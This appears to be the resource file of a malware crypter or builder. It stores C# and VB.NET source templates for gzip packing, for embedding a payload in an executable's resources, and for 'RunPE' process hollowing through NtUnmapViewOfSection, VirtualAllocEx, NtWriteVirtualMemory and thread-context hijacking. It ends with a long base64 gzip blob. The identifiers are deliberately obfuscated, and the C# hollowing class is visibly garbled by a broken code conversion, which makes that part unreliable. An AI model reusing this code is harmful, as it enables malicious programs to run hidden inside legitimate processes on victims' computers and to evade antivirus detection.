<?xml version="1.0" encoding="utf-8"?>
<root>
  <!-- 
    Microsoft ResX Schema 
    
    Version 2.0
    
    The primary goals of this format is to allow a simple XML format 
    that is mostly human readable. The generation and parsing of the 
    various data types are done through the TypeConverter classes 
    associated with the data types.
    
    Example:
    
    ... ado.net/XML headers & schema ...
    <resheader name="resmimetype">text/microsoft-resx</resheader>
    <resheader name="version">2.0</resheader>
    <resheader name="reader">System.Resources.ResXResourceReader, System.Windows.Forms, ...</resheader>
    <resheader name="writer">System.Resources.ResXResourceWriter, System.Windows.Forms, ...</resheader>
    <data name="Name1"><value>this is my long string</value><comment>this is a comment</comment></data>
    <data name="Color1" type="System.Drawing.Color, System.Drawing">Blue</data>
    <data name="Bitmap1" mimetype="application/x-microsoft.net.object.binary.base64">
        <value>[base64 mime encoded serialized .NET Framework object]</value>
    </data>
    <data name="Icon1" type="System.Drawing.Icon, System.Drawing" mimetype="application/x-microsoft.net.object.bytearray.base64">
        <value>[base64 mime encoded string representing a byte array form of the .NET Framework object]</value>
        <comment>This is a comment</comment>
    </data>
                
    There are any number of "resheader" rows that contain simple 
    name/value pairs.
    
    Each data row contains a name, and value. The row also contains a 
    type or mimetype. Type corresponds to a .NET class that support 
    text/value conversion through the TypeConverter architecture. 
    Classes that don't support this are serialized and stored with the 
    mimetype set.
    
    The mimetype is used for serialized objects, and tells the 
    ResXResourceReader how to depersist the object. This is currently not 
    extensible. For a given mimetype the value must be set accordingly:
    
    Note - application/x-microsoft.net.object.binary.base64 is the format 
    that the ResXResourceWriter will generate, however the reader can 
    read any of the formats listed below.
    
    mimetype: application/x-microsoft.net.object.binary.base64
    value   : The object must be serialized with 
            : System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
            : and then encoded with base64 encoding.
    
    mimetype: application/x-microsoft.net.object.soap.base64
    value   : The object must be serialized with 
            : System.Runtime.Serialization.Formatters.Soap.SoapFormatter
            : and then encoded with base64 encoding.

    mimetype: application/x-microsoft.net.object.bytearray.base64
    value   : The object must be serialized into a byte array 
            : using a System.ComponentModel.TypeConverter
            : and then encoded with base64 encoding.
    -->
  <xsd:schema id="root" xmlns="" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata">
    <xsd:import namespace="http://www.w3.org/XML/1998/namespace" />
    <xsd:element name="root" msdata:IsDataSet="true">
      <xsd:complexType>
        <xsd:choice maxOccurs="unbounded">
          <xsd:element name="metadata">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" />
              </xsd:sequence>
              <xsd:attribute name="name" use="required" type="xsd:string" />
              <xsd:attribute name="type" type="xsd:string" />
              <xsd:attribute name="mimetype" type="xsd:string" />
              <xsd:attribute ref="xml:space" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="assembly">
            <xsd:complexType>
              <xsd:attribute name="alias" type="xsd:string" />
              <xsd:attribute name="name" type="xsd:string" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="data">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
                <xsd:element name="comment" type="xsd:string" minOccurs="0" msdata:Ordinal="2" />
              </xsd:sequence>
              <xsd:attribute name="name" type="xsd:string" use="required" msdata:Ordinal="1" />
              <xsd:attribute name="type" type="xsd:string" msdata:Ordinal="3" />
              <xsd:attribute name="mimetype" type="xsd:string" msdata:Ordinal="4" />
              <xsd:attribute ref="xml:space" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="resheader">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
              </xsd:sequence>
              <xsd:attribute name="name" type="xsd:string" use="required" />
            </xsd:complexType>
          </xsd:element>
        </xsd:choice>
      </xsd:complexType>
    </xsd:element>
  </xsd:schema>
  <resheader name="resmimetype">
    <value>text/microsoft-resx</value>
  </resheader>
  <resheader name="version">
    <value>2.0</value>
  </resheader>
  <resheader name="reader">
    <value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
  </resheader>
  <resheader name="writer">
    <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
  </resheader>
  <data name="CompressC" xml:space="preserve">
    <value>using Microsoft.VisualBasic;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Data;
using System.Diagnostics;
using System.IO.Compression;
using System.IO;

public class Compression
{

	public static byte[] Compress(byte[] bytData)
	{
		using (MemoryStream oMS = new MemoryStream()) {
			//GZip object that compress the file 
			using (GZipStream oGZipStream = new GZipStream(oMS, CompressionMode.Compress)) {
				//Write to the Stream object from the buffer
				oGZipStream.Write(bytData, 0, bytData.Length);
				oGZipStream.Close();
				bytData = new byte[oMS.ToArray().Length];
				bytData = oMS.ToArray();
			}
			oMS.Close();
		}
		return bytData;
	}

	public static byte[] Decompress(byte[] bytData)
	{
		using (MemoryStream oMS = new MemoryStream(bytData)) {
			using (GZipStream oGZipStream = new GZipStream(oMS, CompressionMode.Decompress)) {
				const int CHUNK = 1024;
				int intTotalBytesRead = 0;
				do {
					// Enlarge the buffer.
					Array.Resize(ref bytData, intTotalBytesRead + CHUNK);
					// Read the next chunk.
					int intBytesRead = oGZipStream.Read(bytData, intTotalBytesRead, CHUNK);
					intTotalBytesRead += intBytesRead;
					// See if we're done.
					if (intBytesRead &lt; CHUNK) {
						// We're done. Make the buffer fit the data.
						Array.Resize(ref bytData, intTotalBytesRead);
						break; // TODO: might not be correct. Was : Exit Do
					}
				} while (true);
				oGZipStream.Close();
			}
			oMS.Close();
		}
		return bytData;
	}

}</value>
  </data>
  <data name="CompressVB" xml:space="preserve">
    <value>Public Class Compression

    Public Shared Function Compress(ByVal bytData() As Byte) As Byte()
        Using oMS As New MemoryStream()
            'GZip object that compress the file 
            Using oGZipStream As New GZipStream(oMS, CompressionMode.Compress)
                'Write to the Stream object from the buffer
                oGZipStream.Write(bytData, 0, bytData.Length)
                oGZipStream.Close()
                ReDim bytData(oMS.ToArray.Length - 1)
                bytData = oMS.ToArray
            End Using
            oMS.Close()
        End Using
        Return bytData
    End Function

    Public Shared Function Decompress(ByVal bytData() As Byte) As Byte()
        Using oMS As New MemoryStream(bytData)
            Using oGZipStream As New GZipStream(oMS, CompressionMode.Decompress)
                Const CHUNK As Integer = 1024
                Dim intTotalBytesRead As Integer = 0
                Do
                    ' Enlarge the buffer.
                    ReDim Preserve bytData(intTotalBytesRead + CHUNK - 1)
                    ' Read the next chunk.
                    Dim intBytesRead As Integer = oGZipStream.Read(bytData, intTotalBytesRead, CHUNK)
                    intTotalBytesRead += intBytesRead
                    ' See if we're done.
                    If intBytesRead &lt; CHUNK Then
                        ' We're done. Make the buffer fit the data.
                        ReDim Preserve bytData(intTotalBytesRead - 1)
                        Exit Do
                    End If
                Loop
                oGZipStream.Close()
            End Using
            oMS.Close()
        End Using
        Return bytData
    End Function

End Class</value>
  </data>
  <data name="H2BC" xml:space="preserve">
    <value>public byte[] FFF1(string F1)
{
	dynamic F2 = null;
	byte[] F3 = null;
	F1 = Strings.Replace(F1, " ", "");
	F3 = new byte[(Strings.Len(F1) / 2)];
	for (F2 = 0; F2 &lt;= Information.UBound(F3) - 2; F2++) {
		F3[F2] = Convert.ToInt64("&amp;H" + Strings.Mid(F1, 2 * F2 + 1, 2));
	}
	return F3;
}</value>
  </data>
  <data name="H2BVB" xml:space="preserve">
    <value>Function FFF1(ByVal F1 As String) As Byte()
        Dim F2
        Dim F3() As Byte
        F1 = Replace(F1, " ", "")
        ReDim F3((Len(F1) \ 2) - 1)
        For F2 = 0 To UBound(F3) - 2
            F3(F2) = CLng("&amp;H" &amp; Mid$(F1, 2 * F2 + 1, 2))
        Next
        FFF1 = F3
    End Function</value>
  </data>
  <assembly alias="System.Windows.Forms" name="System.Windows.Forms, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
  <data name="Imporr" type="System.Resources.ResXFileRef, System.Windows.Forms">
    <value>..\Resources\Imporr.txt;System.String, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;Windows-1252</value>
  </data>
  <data name="ResWritCCod" xml:space="preserve">
    <value>using Microsoft.VisualBasic;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Data;
using System.Diagnostics;
using System.Runtime.InteropServices;
static class ResourceWriter
{
	private static IntPtr ToPtr(object data)
	{
		GCHandle h = GCHandle.Alloc(data, GCHandleType.Pinned);
		IntPtr ptr = default(IntPtr);
		try {
			ptr = h.AddrOfPinnedObject();
		} finally {
			h.Free();
		}
		return ptr;

	}

	[DllImport("kernel32.dll", SetLastError = true)]
	private static bool UpdateResource(IntPtr hUpdate, string lpType, string lpName, ushort wLanguage, IntPtr lpData, uint cbData)
	{
	}
	[DllImport("kernel32.dll", SetLastError = true)]
	private static IntPtr BeginUpdateResource(string pFileName, 	[MarshalAs(UnmanagedType.Bool)]
bool bDeleteExistingResources)
	{
	}
	[DllImport("kernel32.dll", SetLastError = true)]
	private static bool EndUpdateResource(IntPtr hUpdate, bool fDiscard)
	{
	}

	public static bool WriteResource(string filename, byte[] bytes)
	{

		try {
			IntPtr handle = BeginUpdateResource(filename, false);
			byte[] file1 = bytes;
			IntPtr fileptr = ToPtr(file1);
			bool res = UpdateResource(handle, "GWOLF", "12", 0, fileptr, Convert.ToUInt32(file1.Length));
			EndUpdateResource(handle, false);
		} catch (Exception ex) {
			return false;
		}
		return true;

	}
}</value>
  </data>
  <data name="ResWritStubC" xml:space="preserve">
    <value>using Microsoft.VisualBasic;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Data;
using System.Diagnostics;
using System.Runtime.InteropServices;
static class gaaa
{
	[DllImport("kernel32.dll", SetLastError = true)]
	private static IntPtr FindResource(IntPtr a1, string lpName, string lpType)
	{
	}
	[DllImport("kernel32", EntryPoint = "GetModuleHandleA", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
	private static extern IntPtr a2(string moduleName);
	[DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
	private static extern int SizeofResource(IntPtr a1, IntPtr hResInfo);
	[DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
	private static extern IntPtr LoadResource(IntPtr a1, IntPtr hResInfo);
	public static byte[] namefunres(string a3)
	{
		IntPtr a1 = a2(a3);
		IntPtr a4 = FindResource(a1, "12", "Simon");
		IntPtr a5 = LoadResource(a1, a4);
		dynamic a6 = SizeofResource(a1, a4);
		byte[] a7 = new byte[a6];
		Marshal.Copy(a5, a7, 0, Convert.ToInt32(a6));
		return a7;
	}
}</value>
  </data>
  <data name="ResWritStubVB" xml:space="preserve">
    <value>Module gaaa
    &lt;DllImport("kernel32.dll", SetLastError:=True)&gt; _
    Private Function FindResource(ByVal a1 As IntPtr, ByVal lpName As String, ByVal lpType As String) As IntPtr
    End Function
    Private Declare Function a2 Lib "kernel32" Alias "GetModuleHandleA" (ByVal moduleName As String) As IntPtr
    Private Declare Function SizeofResource Lib "kernel32" (ByVal a1 As IntPtr, ByVal hResInfo As IntPtr) As Integer
    Private Declare Function LoadResource Lib "kernel32" (ByVal a1 As IntPtr, ByVal hResInfo As IntPtr) As IntPtr
    Public Function namefunres(ByVal a3 As String) As Byte()
        Dim a1 As IntPtr = a2(a3)
        Dim a4 As IntPtr = FindResource(a1, "12", "Simon")
        Dim a5 As IntPtr = LoadResource(a1, a4)
        Dim a6 = SizeofResource(a1, a4)
        Dim a7 As Byte() = New Byte(a6 - 1) {}
        Marshal.Copy(a5, a7, 0, CInt(a6))
        Return a7
    End Function
End Module</value>
  </data>
  <data name="ResWritVBCode" xml:space="preserve">
    <value>Imports System.Runtime.InteropServices
Module ResourceWriter
    Private Function ToPtr(ByVal data As Object) As IntPtr
        Dim h As GCHandle = GCHandle.Alloc(data, GCHandleType.Pinned)
        Dim ptr As IntPtr
        Try
            ptr = h.AddrOfPinnedObject()
        Finally
            h.Free()
        End Try
        Return ptr

    End Function

    &lt;DllImport("kernel32.dll", SetLastError:=True)&gt; _
    Private Function UpdateResource(ByVal hUpdate As IntPtr, ByVal lpType As String, ByVal lpName As String, ByVal wLanguage As UShort, ByVal lpData As IntPtr, ByVal cbData As UInteger) As Boolean
    End Function
    &lt;DllImport("kernel32.dll", SetLastError:=True)&gt; _
    Private Function BeginUpdateResource(ByVal pFileName As String, &lt;MarshalAs(UnmanagedType.Bool)&gt; ByVal bDeleteExistingResources As Boolean) As IntPtr
    End Function
    &lt;DllImport("kernel32.dll", SetLastError:=True)&gt; _
    Private Function EndUpdateResource(ByVal hUpdate As IntPtr, ByVal fDiscard As Boolean) As Boolean
    End Function

    Public Function WriteResource(ByVal filename As String, ByVal bytes As Byte()) As Boolean

        Try
            Dim handle As IntPtr = BeginUpdateResource(filename, False)
            Dim file1 As Byte() = bytes
            Dim fileptr As IntPtr = ToPtr(file1)
            Dim res As Boolean = UpdateResource(handle, "GWOLF", "12", 0, fileptr, Convert.ToUInt32(file1.Length))
            EndUpdateResource(handle, False)
        Catch ex As Exception
            Return False
        End Try
        Return True

    End Function
End Module</value>
  </data>
  <data name="RunPE1C" xml:space="preserve">
    <value>using System.Text;
using System.Runtime.InteropServices;
public class alaa {
    
    [DllImport("kernel32.dll", EntryPoint="LoadLibraryA")]
    public static extern IntPtr apii9(string name);
    
    [DllImport("kernel32.dll", EntryPoint="GetProcAddress")]
    public static extern IntPtr apii0(IntPtr handle, string name);
    
    void CreateAPI(void Of, void T) {
        ((string)(name));
        ((string)(method));
        T;
        return;
        Marshal.GetDelegateForFunctionPointer(apii0(apii9(name), method), typeof(T));
        T;
    }
    
    public delegate void apii1(IntPtr hThr, System.UInt32[] CNTXT);
    
    public delegate int apii2(IntPtr hProc, IntPtr baseAddr);
    
    public delegate void apii3(IntPtr hProc, IntPtr baseAddr, ref IntPtr bufr, int bufrSS, ref IntPtr numRead);
    
    public delegate int apii4(IntPtr hThread, IntPtr SC);
    
    public delegate void apii5(IntPtr hThr, System.UInt32[] CNTXT);
    
    public delegate IntPtr apii6(IntPtr hProc, IntPtr addr, IntPtr SS, int allocType, int prot);
    
    public delegate bool apii7(IntPtr hProcess, IntPtr VABA, byte[] lpBuffer, System.UInt32 nSS, int NOBW);
    
    [DllImport("kernel32.dll", EntryPoint="CreateProcessW")]
    static extern void apii8(string appName, StringBuilder commandLine, IntPtr PTA, IntPtr thrAttr, void &lt;, void MarshalAs, void UnmanagedType.Bool);
    
    private bool inherit;
    
    private int creation;
    
    private IntPtr env;
    
    private string curDir;
    
    private byte[] sInfo;
    
    private IntPtr[] pInfo;
    
    private int ReadPtr(long lPtr, long lSS, void =, void &amp;H4) {
        IntPtr lRes;
        // Warning!!! Optional parameters not supported
        int lBr;
        apii3 api4 = CreateAPI(Of, apii3)["ntdll", "NtReadVirtualMemory"];
        api4[Process.GetCurrentProcess.Handle, lPtr, lRes, lSS, lBr];
        return lRes;
    }
    
    public bool iExec(byte[] Buffbawa, string sExe) {
        try {
            GCHandle hGC = GCHandle.Alloc(Buffbawa, GCHandleType.Pinned);
            int hModuleBase = hGC.AddrOfPinnedObject;
            hGC.Free();
            IntPtr PTA = IntPtr.Zero;
            IntPtr[] tPI = new IntPtr[] {
                    3};
            byte[] tSI = new byte[] {
                    67};
            int N2 = BitConverter.ToInt32(Buffbawa, 60);
            int IB;
            System.UInt32[] CNTXT = new System.UInt32[] {
                    178};
            CNTXT[0] = 65538;
            apii8(null, new StringBuilder(sExe), PTA, PTA, false, 4, PTA, null, tSI, tPI);
            int hPE = (hModuleBase + ReadPtr((hModuleBase + 60)));
            IB = ReadPtr((hPE + 52));
            apii2 api3 = CreateAPI(Of, apii2)["ntdll", "NtUnmapViewOfSection"];
            api3[tPI[0], IB];
            apii6 api7 = CreateAPI(Of, apii6)["kernel32", "VirtualAllocEx"];
            IntPtr VABA = api7[tPI[0], IB, ReadPtr((hPE + 80)), 12288, 64];
            IntPtr SA = new IntPtr(BitConverter.ToInt32(Buffbawa, (N2 + 52)));
            IntPtr SS = new IntPtr(BitConverter.ToInt32(Buffbawa, (N2 + 80)));
            int WRET;
            int NOBW;
            int i;
            apii7 api8 = CreateAPI(Of, apii7)["ntdll", "NtWriteVirtualMemory"];
            api8[tPI[0], VABA, Buffbawa, System.UInt32.Parse(int.Parse(ReadPtr((hPE + 84)))), WRET];
            for (i = 0; (i 
                        &lt;= (ReadPtr((hPE + 6), 2) - 1)); i++) {
                int[] Destination = new int[] {
                        9};
                Buffer.BlockCopy(Buffbawa, ((N2 + 248) 
                                + (i * 40)), Destination, 0, 40);
                byte[] B2 = new byte[] {
                        (Destination[4] - 1)};
                Buffer.BlockCopy(Buffbawa, Destination[5], B2, 0, B2.Length);
                SS = new IntPtr((VABA.ToInt32() + Destination[3]));
                SA = new IntPtr(B2.Length);
                api8[tPI[0], SS, B2, System.UInt32.Parse(SA), NOBW];
            }
            apii1 api2 = CreateAPI(Of, apii1)["ntdll", "NtGetContextThread"];
            api2[tPI[1], CNTXT];
            api8[tPI[0], (CNTXT[41] + 8), BitConverter.GetBytes(VABA.ToInt32()), ((System.UInt32)(4)), NOBW];
            CNTXT[44] = (IB + ReadPtr((hPE + 40)));
            apii5 api6 = CreateAPI(Of, apii5)["ntdll", "NtSetContextThread"];
            api6[tPI[1], CNTXT];
            apii4 api5 = CreateAPI(Of, apii4)["ntdll", "NtResumeThread"];
            api5[tPI[1], 0];
        }
        catch (Exception ex) {
            return false;
        }
        return true;
    }
}</value>
  </data>
  <data name="RunPE1VB" xml:space="preserve">
    <value>Public Class alaa
    Public Declare Function apii9 Lib "kernel32" Alias "LoadLibraryA" (ByVal name As String) As IntPtr
    Public Declare Function apii0 Lib "kernel32" Alias "GetProcAddress" (ByVal handle As IntPtr, ByVal name As String) As IntPtr
    Function CreateAPI(Of T)(ByVal name As String, ByVal method As String) As T
        Return DirectCast(DirectCast(Marshal.GetDelegateForFunctionPointer(apii0(apii9(name), method), GetType(T)), Object), T)
    End Function
    Delegate Function apii1(ByVal hThr As IntPtr, ByVal CNTXT As UInteger()) As &lt;MarshalAs(UnmanagedType.Bool)&gt; Boolean
    Delegate Function apii2(ByVal hProc As IntPtr, ByVal baseAddr As IntPtr) As UInteger
    Delegate Function apii3(ByVal hProc As IntPtr, ByVal baseAddr As IntPtr, ByRef bufr As IntPtr, ByVal bufrSS As Integer, ByRef numRead As IntPtr) As &lt;MarshalAs(UnmanagedType.Bool)&gt; Boolean
    Delegate Function apii4(ByVal hThread As IntPtr, ByVal SC As IntPtr) As UInteger
    Delegate Function apii5(ByVal hThr As IntPtr, ByVal CNTXT As UInteger()) As &lt;MarshalAs(UnmanagedType.Bool)&gt; Boolean
    Delegate Function apii6(ByVal hProc As IntPtr, ByVal addr As IntPtr, ByVal SS As IntPtr, ByVal allocType As Integer, ByVal prot As Integer) As IntPtr
    Delegate Function apii7(ByVal hProcess As IntPtr, ByVal VABA As IntPtr, ByVal lpBuffer As Byte(), ByVal nSS As UInteger, ByVal NOBW As Integer) As Boolean
    Public Declare Auto Function apii8 Lib "kernel32" Alias "CreateProcessW" (ByVal appName As String, ByVal commandLine As StringBuilder, ByVal PTA As IntPtr, ByVal thrAttr As IntPtr, &lt;MarshalAs(UnmanagedType.Bool)&gt; ByVal inherit As Boolean, ByVal creation As Integer, ByVal env As IntPtr, ByVal curDir As String, ByVal sInfo As Byte(), ByVal pInfo As IntPtr()) As &lt;MarshalAs(UnmanagedType.Bool)&gt; Boolean
    Private Function ReadPtr(ByVal lPtr As Long, Optional ByVal lSS As Long = &amp;H4) As Integer
        Dim lRes As IntPtr
        Dim lBr As Integer
        Dim api4 As apii3 = CreateAPI(Of apii3)("ntdll", "NtReadVirtualMemory")
        Call api4(Process.GetCurrentProcess.Handle, lPtr, lRes, lSS, lBr)
        Return lRes
    End Function
   
    Public Function iExec(ByVal Buffbawa As Byte(), ByVal sExe As String) As Boolean
        Try
            Dim hGC As GCHandle = GCHandle.Alloc(Buffbawa, GCHandleType.Pinned) : Dim hModuleBase As Integer = hGC.AddrOfPinnedObject : hGC.Free()
            Dim PTA As IntPtr = IntPtr.Zero
            Dim tPI As IntPtr() = New IntPtr(3) {}
            Dim tSI As Byte() = New Byte(67) {}
            Dim N2 As Integer = BitConverter.ToInt32(Buffbawa, 60)
            Dim IB As Integer
            Dim CNTXT As UInteger() = New UInteger(178) {}
            CNTXT(0) = &amp;H10002
            apii8(Nothing, New StringBuilder(sExe), PTA, PTA, False, 4, PTA, Nothing, tSI, tPI)
            Dim hPE As Integer = (hModuleBase + ReadPtr(hModuleBase + &amp;H3C))
            IB = ReadPtr(hPE + &amp;H34)
            Dim api3 As apii2 = CreateAPI(Of apii2)("ntdll", "NtUnmapViewOfSection")
            api3(tPI(0), IB)
            Dim api7 As apii6 = CreateAPI(Of apii6)("kernel32", "VirtualAllocEx")
            Dim VABA As IntPtr = api7(tPI(0), IB, ReadPtr(hPE + &amp;H50), &amp;H3000, &amp;H40)
            Dim SA As New IntPtr(BitConverter.ToInt32(Buffbawa, N2 + &amp;H34))
            Dim SS As New IntPtr(BitConverter.ToInt32(Buffbawa, N2 + 80))
            Dim WRET As Integer
            Dim NOBW As Integer
            Dim i As Integer
            Dim api8 As apii7 = CreateAPI(Of apii7)("ntdll", "NtWriteVirtualMemory")
            api8(tPI(0), VABA, Buffbawa, CUInt(CInt(ReadPtr(hPE + &amp;H54))), WRET)
            For i = 0 To ReadPtr(hPE + &amp;H6, 2) - 1
                Dim Destination As Integer() = New Integer(9) {}
                Buffer.BlockCopy(Buffbawa, (N2 + &amp;HF8) + (i * 40), Destination, 0, 40)
                Dim B2 As Byte() = New Byte((Destination(4) - 1)) {}
                Buffer.BlockCopy(Buffbawa, Destination(5), B2, 0, B2.Length)
                SS = New IntPtr(VABA.ToInt32() + Destination(3))
                SA = New IntPtr(B2.Length)
                api8(tPI(0), SS, B2, CUInt(SA), NOBW)
            Next i
            Dim api2 As apii1 = CreateAPI(Of apii1)("ntdll", "NtGetContextThread")
            api2(tPI(1), CNTXT)
            api8(tPI(0), CNTXT(41) + &amp;H8, BitConverter.GetBytes(VABA.ToInt32()), CUInt(&amp;H4), NOBW)
            CNTXT(&amp;H2C) = IB + ReadPtr(hPE + &amp;H28)
            Dim api6 As apii5 = CreateAPI(Of apii5)("ntdll", "NtSetContextThread")
            api6(tPI(1), CNTXT)
            Dim api5 As apii4 = CreateAPI(Of apii4)("ntdll", "NtResumeThread")
            api5(tPI(1), 0)
        Catch ex As Exception
            Return False
        End Try
        Return True
    End Function
End Class</value>
  </data>
  <data name="RunPE2C" xml:space="preserve">
    <value>using System;
using System.Collections.Generic;
using System.Text;
using System.Reflection;
using System.IO.Compression;
using System.IO;
public class ClassName
{

    private static string a1 = "AFgAAB+LCAAAAAAABADtvQdgHEmWJSYvbcp7f0r1StfgdKEIgGATJNiQQBDswYjN5pLsHWlHIymrKoHKZVZlXWYWQMztnbz33nvvv" + "ffee++997o7nU4n99//P1xmZAFs9s5K2smeIYCqyB8/fnwfPyLe/OQv+onj4y+O6TnFP3fvHhwfP784Ns9P2N9u98ib++fri/3j9" + "nj54mxy8eTNFzvzn/x8vppeP7maLh4up4tn7dnnL+aTxf3L2cmT4qdeP7mefXf/IqP/vzp9+Obs893Ln/r8q/XTn9j5vb5jIT/5i" + "Vc/cXz85vj06fHJwU+8Kr1Ov6T/F6fPj3+iOT5+eoVPTvWb4wdlZdH6ffSzU4Mm/fvEQbHvHB+f2O/l+eL4J86+ksb6wqn+nx8PC" + "D/fmWf04Rv+/fPI9/5zhn+A85OL7/7E8fG3NzS96Tmj/590PjvBB6duPuXD+zs/9XvPd/Drw6eOPi/5y7OwLbc/xjjW0+WL69+HU" + "ZWPfx/X/pP+S0Ks58vvlJPPH/70sTKZgmc0f6L/En/2Ex105Xn6E981n8t4CMZXx09O9o+Pn13VaBB762s9T764Ior8BP9O/57+x" + "Hd+8OIKM1R9frx3cJ8+/fw7RZUfFxc/Sb//Xr/XfP8kvzpD4190dnH29Pwn5PdvX3znAd5/crL6RdT290bb44svKgz+ycXZye91P" + "KXffuqhtKl+r2fX9v/Z9B3GuPr0jYFxfFY9AQ7l29/7u3urVVasPj++0M8uXr757pdPDBzB/+oYuPHMnv7EF6c/ff370B+n1P/kz" + "ZPXFwD++bM14Y7fpP3Mtf/O5ecE66T4fZ4+OTtYoMXJxdnnO1dfVWfoYz65OLn46hd9vvwCQH+vfP37nH7+9IufmF6QRHz7yfW3q" + "c30219k/N3FT7QnP3H2dPKOZPO4qk8vfuL3/uJq/+Q73z34KabH7vzy8ytInOmz+vz3WpwRPSFdP/H0q4uzUn//vXd25zrGVXG8b" + "MBgp8e7X5x85/eW3z9/8eL3Of8JbvuLfh9LtxdfHRc/Kb8/qd9899s73Nbv4yd/wvaRuz6qxfHFy9e/1xMM8ff5Rd+hed15zXP4+" + "e9VnJ0cX1/8Pt7vP8W/10SHk/3TJ0+qH2DMO8XFd/nzi5/4qS+uLtBO3l+eEb+SLnw7Bb1+8DnR/GRZvfmCROQnqW8WlSenRDMIW" + "3X6ez2BqBJfXDREv7OnT/YOctCO5hE/P3/ybvb7nFxNP/9iXZ0Sf/zE8cVPfPeL1z/x7PM3Xzx78mSenR7bsX6XJvIa71iaHL+yN" + "Jtamn1x+ns9hbj+Ppa2T55Z2l8fX5l2P1F9wfxn6Xdq6Usy8Xs9+Qp4/6LjJ83Vk5948m2jb09/7y/Adb/XyfKLOf+890WBn0+Pf" + "+LN03e/z5vTk+a7pz9x8Or0O9WL44uLz59cva1+L/Q3P/2JZ7sXb06fnP7E6U988mX25nnx7av9ycnnB9Avv9d3y4vJd5+0v8/p1" + "U+8evLl00+evvvi2elP/OQPoM2fzL/4/PQnfp/zn/zuAc8J/X5RfELIf37Ac2JgnF5NiVaYhJ+YfHH1+7x68m7+U/TZd0+vLuqz4" + "/kl7NHJ/IvvAFb2uYX16uS7B1P5/eL3/u6TL87o56snP3ieoZ/1Mb6xbU/OWRX+RPUd6uZkIe8RP7NJ+fynv5jyOz8RvkO8s8Tvw" + "hO/T/3mJ77zgDXsk+YHrwivM8jQfPru81enn589h05/cvmMx32Ksb3F2PTds8k1+q+++8Wrt6+eFCfQZ8eTd78Pvnv15ELHqHgBl" + "7sPGRemk8Xz6Re/D767OPgJ+x3o8OTdKttZWLzPf2+P3ldXDIf/vndxRX1fffv0J37q8jvg/5b+fs1j/L1Of+Inzn/iydnvtX9yA" + "bw//8789NnvdQJ06p94As4pLjDA3+v3OsHXq13+bP7F89OfaC+f/wTP9RenP/FV9R2myenp6U9Ur0/WxxXG9aT4fT6fXOP16s3p6"
   + "+YnTuen1e/F7b54cfoTO9VzjH1+9ur3OmGZa+8/3P/ydP7tT55dAHBrcP325HpfYBSAcVY9Fxhfnl7sV18IjNe/19NTD8ZzgvGVD" + "+PVU9LVP/EViHIGzKBDjn8vyNHZT2BqxV7yg++fLiBz3/4J/P0FTMiX4ffHPwX54u+f/j7h99DvP3H80/zrT7A9aI/nv88vOr73F" + "ezmk+fHB09Xr6GfT38vMq3Cl0X19Pd6CriQX7aH+/z+BduHB4Dz5Lj6/PNn5TN2XwQHkFj8opPmJ4lnf3CMeSKb9+LYwBSdcP7Tv" + "w//PP0B2e3nDACuz6unF692oVOOX+98B7/jvePXV9OnFz9RwQafXFRPnyzKSwzu5OKLz799/eSns+8eADfqZ/90xl7XafPt4y++f" + "PJtJu6T3+sp+KR68+TJ2envdYL+V/J+UaHNLto8P7n48smTt9WXmJuL5unpxWn1pczps9OLr4yscj9PfmJ2+ZLf/31+EXD8vdDlT" + "1ydPX+yf3Jywrz5+dOf+OI1jR9e6u81+QEYtDolHfEQf5Pv8PSYcBWe/imDyx7xdYF36T3M1eewzUSfU6EqE5hE/e3628dnv8/z+" + "cXJ58X+V8fzZn367bMnYk8OfHvyjL7/fZ68ulg/O/7qp57Pn1yDf6bf/s5Pcdt3QHP16fHVT1ToB76Nzkn1Eu8XV7/3dPEWs/J0u" + "mrwk2zCAd75wU8A3+XqB6DJk4vm20+WO/C9Tp9cfeeheH3TZ+c/ATr/xLfvXvw+8B8+n16xPcF8nzATCq+8+r1OwS2rS/h8JDMwA" + "mi3eFKIPfwJZo0K9vC79P2T/eOr+inZhO8ev3h98uT8zXePrz4nm/B7PZlX1w8uzl78Xlc73/nOK7Lzxzvf/snjn8i+++r4hOzx5" + "YOrt2+enDTQLeWzhy9gI8i3IDv58oz5+8nxE+ie4xPq7/T1xTvg/Pzki5Onx1+8+L3efXH2nVcP0Nd35OfuFz/5Ez+RC+z9y09/4" + "uL3OvmJpv7y+OwN2c43T36C+r3+fepn705PGZcnX5AO+qr8vEW/P/l7+Xjdf3V6Sjrq2cl1850nF7NvE06/t3z3+1wdXHd8zHdip" + "9nHfCW/f0k+4LOfAM+ekWxh/n4fGc/F00uMhyfmJ774vY6vfurB7415fnbx/Mm9qwIf5z8AO7+5+OnXeO/0i/MLzO9PfPX578M2/" + "Mkp7N/89zmryIY8u/pC9GnFvvYTfPb58ezgDDC/3dwFgJ9mOfu8gE5nAMXv892nr9uHXt8XHCiQn3Yy++L893q2wjyQrXz1AGN48" + "uXJS+jG41dfPOvjMiXbQvjMenh8m3B7RTjABhGTiA356RPoM+Ay/X0YPvo/u7pv3pmwjf99FuQD03yRT3288x2iC/yR0/wa3/3E3" + 